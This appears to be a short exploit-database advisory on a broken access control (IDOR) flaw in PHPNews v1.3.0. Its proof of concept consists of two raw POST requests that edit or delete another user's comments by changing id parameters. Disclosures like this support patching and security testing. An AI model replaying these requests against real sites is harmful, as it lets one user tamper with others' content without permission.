# Exploit Title: PHPNews v1.3.0 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/newsphp/files/PHPNews%201._/PHPNews%201.3.0/phpnews_1-3-0.zip/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v1.3.0
## Exploit Description:
## PHPNews v1.3.0 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to update or delete comment that owned by other user(horizontal privilege escalation).

## -----------------------------------------------POC-------------------------------------------------------------------
```
POST /index.php?action=updatecomments HTTP/1.1
...

id=3(CHANGE HERE)&name=user1&email=&website=&message=i+am+user1&numcomments=1
```
```
POST /index.php?action=updatecomments HTTP/1.1
...
delete%5B0%5D=1(CHANGE HERE)&ids%5B0%5D=2&numcomments=1
```